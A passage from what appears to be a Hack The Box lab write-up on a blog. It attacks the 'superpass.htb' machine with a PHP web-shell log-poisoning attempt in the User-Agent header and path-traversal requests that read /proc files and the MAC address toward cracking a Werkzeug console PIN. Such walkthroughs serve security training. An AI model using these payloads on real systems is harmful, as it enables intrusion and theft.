</span></span><span style="display:flex;"><span>Content-Disposition<span style="color:#f92672">:</span> <span style="color:#ae81ff">attachment; filename=superpass_export.csv</span>
</span></span><span style="display:flex;"><span>Vary<span style="color:#f92672">:</span> <span style="color:#ae81ff">Cookie</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">2023/02/28 16:21:17 [error] 1004#1004: *14 open() &#34;/app/app/superpass/static/webfonts/josefinsans.ttf&#34; failed (2: No such file or directory)</span>,<span style="color:#e6db74"> client: 10.10.14.40</span>,<span style="color:#e6db74"> server: superpass.htb</span>,<span style="color:#e6db74"> request: &#34;GET /static/webfonts/josefinsans.ttf HTTP/1.1&#34;</span>,<span style="color:#e6db74"> host: &#34;superpass.htb&#34;</span>,<span style="color:#e6db74"> referrer: &#34;http://superpass.htb/static/css/josefinsans.css&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">2023/02/28 16:23:58 [error] 1004#1004: *18 open() &#34;/app/app/superpass/static/webfonts/josefinsans.ttf&#34; failed (2: No such file or directory)</span>,<span style="color:#e6db74"> client: 10.10.14.40</span>,<span style="color:#e6db74"> server: superpass.htb</span>,<span style="color:#e6db74"> request: &#34;GET /static/webfonts/josefinsans.ttf HTTP/1.1&#34;</span>,<span style="color:#e6db74"> host: &#34;superpass.htb&#34;</span>,<span style="color:#e6db74"> referrer: &#34;http://superpass.htb/static/css/josefinsans.css&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">2023/02/28 16:23:59 [error] 1004#1004: *18 open() &#34;/app/app/superpass/static/webfonts/josefinsans.ttf&#34; failed (2: No such file or directory)</span>,<span style="color:#e6db74"> client: 10.10.14.40</span>,<span style="color:#e6db74"> server: superpass.htb</span>,<span style="color:#e6db74"> request: &#34;GET /static/webfonts/josefinsans.ttf HTTP/1.1&#34;</span>,<span style="color:#e6db74"> host: &#34;superpass.htb&#34;</span>,<span style="color:#e6db74"> referrer: &#34;http://superpass.htb/static/css/josefinsans.css&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">2023/02/28 16:24:04 [error] 1004#1004: *18 open() &#34;/app/app/superpass/static/webfonts/josefinsans.ttf&#34; failed (2: No such file or directory)</span>,<span style="color:#e6db74"> client: 10.10.14.40</span>,<span style="color:#e6db74"> server: superpass.htb</span>,<span style="color:#e6db74"> request: &#34;GET /static/webfonts/josefinsans.ttf HTTP/1.1&#34;</span>,<span style="color:#e6db74"> host: &#34;superpass.htb&#34;</span>,<span style="color:#e6db74"> referrer: &#34;http://superpass.htb/static/css/josefinsans.css&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">2023/02/28 16:24:16 [error] 1004#1004: *18 open() &#34;/app/app/superpass/static/webfonts/josefinsans.ttf&#34; failed (2: No such file or directory)</span>,<span style="color:#e6db74"> client: 10.10.14.40</span>,<span style="color:#e6db74"> server: superpass.htb</span>,<span style="color:#e6db74"> request: &#34;GET /static/webfonts/josefinsans.ttf HTTP/1.1&#34;</span>,<span style="color:#e6db74"> host: &#34;superpass.htb&#34;</span>,<span style="color:#e6db74"> referrer: &#34;http://superpass.htb/static/css/josefinsans.css&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">2023/02/28 16:24:47 [error] 1004#1004: *18 open() &#34;/app/app/superpass/static/webfonts/josefinsans.ttf&#34; failed (2: No such file or directory)</span>,<span style="color:#e6db74"> client: 10.10.14.40</span>,<span style="color:#e6db74"> server: superpass.htb</span>,<span style="color:#e6db74"> request: &#34;GET /static/webfonts/josefinsans.ttf HTTP/1.1&#34;</span>,<span style="color:#e6db74"> host: &#34;superpass.htb&#34;</span>,<span style="color:#e6db74"> referrer: &#34;http://superpass.htb/static/css/josefinsans.css&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">2023/02/28 16:29:48 [error] 1004#1004: *34 open() &#34;/app/app/superpass/static/webfonts/josefinsans.ttf&#34; failed (2: No such file or directory)</span>,<span style="color:#e6db74"> client: 10.10.14.40</span>,<span style="color:#e6db74"> server: superpass.htb</span>,<span style="color:#e6db74"> request: &#34;GET /static/webfonts/josefinsans.ttf HTTP/1.1&#34;</span>,<span style="color:#e6db74"> host: &#34;superpass.htb&#34;</span>,<span style="color:#e6db74"> referrer: &#34;http://superpass.htb/static/css/josefinsans.css&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">2023/02/28 16:29:49 [error] 1004#1004: *34 open() &#34;/app/app/superpass/static/webfonts/josefinsans.ttf&#34; failed (2: No such file or directory)</span>,<span style="color:#e6db74"> client: 10.10.14.40</span>,<span style="color:#e6db74"> server: superpass.htb</span>,<span style="color:#e6db74"> request: &#34;GET /static/webfonts/josefinsans.ttf HTTP/1.1&#34;</span>,<span style="color:#e6db74"> host: &#34;superpass.htb&#34;</span>,<span style="color:#e6db74"> referrer: &#34;http://superpass.htb/static/css/josefinsans.css&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;SNIP&gt;</span>
</span></span></code></pre></div><p>And also the access.log</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
</span></span><span style="display:flex;"><span>Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">nginx/1.18.0 (Ubuntu)</span>
</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Thu, 13 Mar 2025 23:36:17 GMT</span>
</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/csv; charset=utf-8</span>
</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">9673377</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
</span></span><span style="display:flex;"><span>Content-Disposition<span style="color:#f92672">:</span> <span style="color:#ae81ff">attachment; filename=superpass_export.csv</span>
</span></span><span style="display:flex;"><span>Vary<span style="color:#f92672">:</span> <span style="color:#ae81ff">Cookie</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">127.0.0.1 - - [08/Feb/2023:16:36:03 +0000] &#34;GET /account/login HTTP/1.1&#34; 200 1385 &#34;-&#34; &#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML</span>,<span style="color:#e6db74"> like Gecko) HeadlessChrome/108.0.5359.94 Safari/537.36&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">127.0.0.1 - - [08/Feb/2023:16:36:03 +0000] &#34;GET /static/css/josefinsans.css HTTP/1.1&#34; 200 153 &#34;http://test.superpass.htb/account/login&#34; &#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML</span>,<span style="color:#e6db74"> like Gecko) HeadlessChrome/108.0.5359.94 Safari/537.36&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">127.0.0.1 - - [08/Feb/2023:16:36:03 +0000] &#34;GET /static/js/popper.min.js HTTP/1.1&#34; 200 20337 &#34;http://test.superpass.htb/account/login&#34; &#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML</span>,<span style="color:#e6db74"> like Gecko) HeadlessChrome/108.0.5359.94 Safari/537.36&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">127.0.0.1 - - [08/Feb/2023:16:36:03 +0000] &#34;GET /static/css/site.css HTTP/1.1&#34; 200 1946 &#34;http://test.superpass.htb/account/login&#34; &#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML</span>,<span style="color:#e6db74"> like Gecko) HeadlessChrome/108.0.5359.94 Safari/537.36&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">127.0.0.1 - - [08/Feb/2023:16:36:03 +0000] &#34;GET /static/css/bootstrap.min.css HTTP/1.1&#34; 200 140936 &#34;http://test.superpass.htb/account/login&#34; &#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML</span>,<span style="color:#e6db74"> like Gecko) HeadlessChrome/108.0.5359.94 Safari/537.36&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">127.0.0.1 - - [08/Feb/2023:16:36:03 +0000] &#34;GET /static/css/all.min.css HTTP/1.1&#34; 200 101894 &#34;http://test.superpass.htb/account/login&#34; &#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML</span>,<span style="color:#e6db74"> like Gecko) HeadlessChrome/108.0.5359.94 Safari/537.36&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;SNIP&gt;</span>
</span></span></code></pre></div><p>Which include the User-Agent header. This means we might be able to poison the logs by modifying the User-Agent header. Let&rsquo;s send a request with a modified User-Agent</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /vault <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">superpass.htb</span>
</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</span>
</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate, br</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>Priority<span style="color:#f92672">:</span> <span style="color:#ae81ff">u=0, i</span>
</span></span></code></pre></div><p>Looks like it went through, but we may need to escape the double quotes</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>10.10.14.51 - - [13/Mar/2025:23:38:59 +0000] &#34;GET /account/login?next=%2Fvault HTTP/1.1&#34; 200 1385 &#34;http://superpass.htb/vault&#34; &#34;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&#34;
</span></span></code></pre></div><p>But that doesn&rsquo;t work. Remember earlier, the application gave us that weird error page? There were some full paths in there. Let&rsquo;s try one</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /download?fn=../../../app/venv/lib/python3.10/site-packages/pymysql/connections.py <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">superpass.htb</span>
</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span><span style="color:#ae81ff"> </span>
</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate, br</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">remember_token=9|dc4f849e4492fdc4dab194ba371d39b00ad86a2e4cdc0a84c66c21ecbdf2360a9324de834cb47170ef1107755fa3a28b174ae50c69e7a0571f1311ab124fc7ab; session=.eJwlzkkOwjAMAMC_5MwhXuqln0FO7AiuLT0h_g4S84J5t_s66ny0_XVcdWv3Z7a9lWOkE-haW4kOJjUSdjcEUAhnR9SUQBiTmEG1AlZZF0ypRclT2Jywp4_JYDFMAITDUSDmGBqblkIP2qi60ApJSHK1uaz9ItdZx3_j7fMFOgkuCA.Z9Nkkw.2MhARMSbEZofegN-_7jUxf3nNEM</span>
</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>Priority<span style="color:#f92672">:</span> <span style="color:#ae81ff">u=0, i</span>
</span></span></code></pre></div><p>And we can see the Python script</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
</span></span><span style="display:flex;"><span>Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">nginx/1.18.0 (Ubuntu)</span>
</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Thu, 13 Mar 2025 23:52:12 GMT</span>
</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/csv; charset=utf-8</span>
</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">51251</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
</span></span><span style="display:flex;"><span>Content-Disposition<span style="color:#f92672">:</span> <span style="color:#ae81ff">attachment; filename=superpass_export.csv</span>
</span></span><span style="display:flex;"><span>Vary<span style="color:#f92672">:</span> <span style="color:#ae81ff">Cookie</span>
</span></span><span style="display:flex;"><span>Set-Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">session=.eJwlzjsOwjAMANC7ZGaIY9efXqZyYlsgMbViQtwdJN4J3rsddeZ1b3v588pbOx7R9pY2PAxBqrZkmYSiyGSmA0DAjWwMCfYBcyERiKRDpXYewVkYtJjUcPSwuQjUpzIAk9tg8DWn-CYp0B03zM5YzgGBJrpK2y_yuvL8b6x9vmvpLlM.Z9NvrA._eSn0fu6iQopHNaj68vIvAWzJHA; HttpOnly; Path=/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74"># Python implementation of the MySQL client-server protocol</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74"># http://dev.mysql.com/doc/internals/en/client-server-protocol.html</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74"># Error codes:</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74"># https://dev.mysql.com/doc/refman/5.5/en/error-handling.html</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">import errno</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">import os</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">import socket</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">import struct</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">import sys</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">import traceback</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">import warnings</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">from . import _auth</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">from .charset import charset_by_name</span>,<span style="color:#e6db74"> charset_by_id</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">from .constants import CLIENT</span>,<span style="color:#e6db74"> COMMAND</span>,<span style="color:#e6db74"> CR</span>,<span style="color:#e6db74"> FIELD_TYPE</span>,<span style="color:#e6db74"> SERVER_STATUS</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">from . import converters</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">from .cursors import Cursor</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">from .optionfile import Parser</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">from .protocol import (</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">    dump_packet</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">    MysqlPacket</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">    FieldDescriptorPacket</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">    OKPacketWrapper</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">    EOFPacketWrapper</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">    LoadLocalPacketWrapper</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">)</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">from . import err</span>,<span style="color:#e6db74"> VERSION_STRING</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">try:</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">    import ssl</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">    SSL_ENABLED = True</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">except ImportError:</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">    ssl = None</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">    SSL_ENABLED = False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">try:</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">    import getpass</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">    DEFAULT_USER = getpass.getuser()</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">    del getpass</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">except (ImportError</span>,<span style="color:#e6db74"> KeyError):</span>
</span></span></code></pre></div><p>Requesting <code>app.py</code> and we see <code>Console Locked</code> in the code</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;SNIP&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;h3&gt;Console Locked&lt;/h3&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;p&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          The console is locked and needs to be unlocked by entering the PIN.
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          You can find the PIN printed out on the standard output of your
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          shell that runs the server.
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;SNIP&gt;
</span></span></span></code></pre></div><p>We also noticed <code>Werkzueg</code> in the previous error messages and source code which logically points us towards cracking the console PIN so we can achieve remote code execution. To do this, we need a few pieces of information. First, we need the user that is running the webserver</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /download?fn=../../../proc/self/environ <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">superpass.htb</span>
</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span><span style="color:#ae81ff"> </span>
</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate, br</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">remember_token=9|dc4f849e4492fdc4dab194ba371d39b00ad86a2e4cdc0a84c66c21ecbdf2360a9324de834cb47170ef1107755fa3a28b174ae50c69e7a0571f1311ab124fc7ab; session=.eJwlzkkOwjAMAMC_5MwhXuqln0FO7AiuLT0h_g4S84J5t_s66ny0_XVcdWv3Z7a9lWOkE-haW4kOJjUSdjcEUAhnR9SUQBiTmEG1AlZZF0ypRclT2Jywp4_JYDFMAITDUSDmGBqblkIP2qi60ApJSHK1uaz9ItdZx3_j7fMFOgkuCA.Z9Nkkw.2MhARMSbEZofegN-_7jUxf3nNEM</span>
</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>Priority<span style="color:#f92672">:</span> <span style="color:#ae81ff">u=0, i</span>
</span></span></code></pre></div><p>Querying <code>/proc/self/environ</code> tells us this is the <code>www-data</code> user</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
</span></span><span style="display:flex;"><span>Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">nginx/1.18.0 (Ubuntu)</span>
</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Fri, 14 Mar 2025 00:07:27 GMT</span>
</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/csv; charset=utf-8</span>
</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">260</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
</span></span><span style="display:flex;"><span>Content-Disposition<span style="color:#f92672">:</span> <span style="color:#ae81ff">attachment; filename=superpass_export.csv</span>
</span></span><span style="display:flex;"><span>Vary<span style="color:#f92672">:</span> <span style="color:#ae81ff">Cookie</span>
</span></span><span style="display:flex;"><span>Set-Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">session=.eJwlzjsOwjAMANC7ZGaIY9efXqZyYlsgMbViQtwdJN4J3rsddeZ1b3v588pbOx7R9pY2PAxBqrZkmYSiyGSmA0DAjWwMCfYBcyERiKRDpXYewVkYtJjUcPSwuQjUpzIAk9tg8DWn-CYp0B03zM5YzgGBJrpK2y_yuvL8b6x9vmvpLlM.Z9NzPw.Hb06QqGU94MOJ8zhY5BQeL678d0; HttpOnly; Path=/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">LANG=C.UTF-8</span>
</span></span></code></pre></div><p>Then we need to get the MAC address. First we query <code>proc/net/arp</code> to get the interface</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
</span></span><span style="display:flex;"><span>Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">nginx/1.18.0 (Ubuntu)</span>
</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Fri, 14 Mar 2025 00:10:05 GMT</span>
</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/csv; charset=utf-8</span>
</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">156</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
</span></span><span style="display:flex;"><span>Content-Disposition<span style="color:#f92672">:</span> <span style="color:#ae81ff">attachment; filename=superpass_export.csv</span>
</span></span><span style="display:flex;"><span>Vary<span style="color:#f92672">:</span> <span style="color:#ae81ff">Cookie</span>
</span></span><span style="display:flex;"><span>Set-Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">session=.eJwlzjsOwjAMANC7ZGaIY9efXqZyYlsgMbViQtwdJN4J3rsddeZ1b3v588pbOx7R9pY2PAxBqrZkmYSiyGSmA0DAjWwMCfYBcyERiKRDpXYewVkYtJjUcPSwuQjUpzIAk9tg8DWn-CYp0B03zM5YzgGBJrpK2y_yuvL8b6x9vmvpLlM.Z9Nz3Q.m-c57iEwjLxBJIUgTgibJkJj-vM; HttpOnly; Path=/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">IP address       HW type     Flags       HW address            Mask     Device</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">10.10.10.2       0x1         0x2         00:50:56:b9:5d:68     *        eth0</span>
</span></span></code></pre></div><p>Then query that interface with <code>sys/class/net/eth0/address</code> for the MAC address</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
</span></span><span style="display:flex;"><span>Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">nginx/1.18.0 (Ubuntu)</span>
</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Fri, 14 Mar 2025 00:12:23 GMT</span>
</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/csv; charset=utf-8</span>
</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">18</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
</span></span><span style="display:flex;"><span>Content-Disposition<span style="color:#f92672">:</span> <span style="color:#ae81ff">attachment; filename=superpass_export.csv</span>
</span></span><span style="display:flex;"><span>Vary<span style="color:#f92672">:</span> <span style="color:#ae81ff">Cookie</span>
</span></span><span style="display:flex;"><span>Set-Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">session=.eJwlzjsOwjAMANC7ZGaIY9efXqZyYlsgMbViQtwdJN4J3rsddeZ1b3v588pbOx7R9pY2PAxBqrZkmYSiyGSmA0DAjWwMCfYBcyERiKRDpXYewVkYtJjUcPSwuQjUpzIAk9tg8DWn-CYp0B03zM5YzgGBJrpK2y_yuvL8b6x9vmvpLlM.Z9N0Zw.aSAI2fL5tiky72RPfrevad3-jv8; HttpOnly; Path=/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">00:50:56:b0:fe:7a</span>
</span></span></code></pre></div><pre tabindex="0"><code>&lt;table&gt;
&lt;tr&gt;
&lt;th&gt;Json 1&lt;/th&gt;
&lt;th&gt;Markdown&lt;/th&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
  
```json
{
  &#34;id&#34;: 1,
  &#34;username&#34;: &#34;joe&#34;,
  &#34;email&#34;: &#34;joe@example.com&#34;,
  &#34;order_id&#34;: &#34;3544fc0&#34;
}
```
  
&lt;/td&gt;
&lt;td&gt;

```json
{
  &#34;id&#34;: 5,
  &#34;username&#34;: &#34;mary&#34;,
  &#34;email&#34;: &#34;mary@example.com&#34;,
  &#34;order_id&#34;: &#34;f7177da&#34;
}
```

&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;
</code></pre>
</content>
<p>
  
  <a href="http://localhost:1313/blog/htb/">#HTB</a>
  
  <a href="http://localhost:1313/blog/pentesting/">#Pentesting</a>
  
</p>

  </main>
  <footer>Made with <a href="https://github.com/janraasch/hugo-bearblog/">Hugo ʕ•ᴥ•ʔ Bear</a>
</footer>

    
</body>

</html>
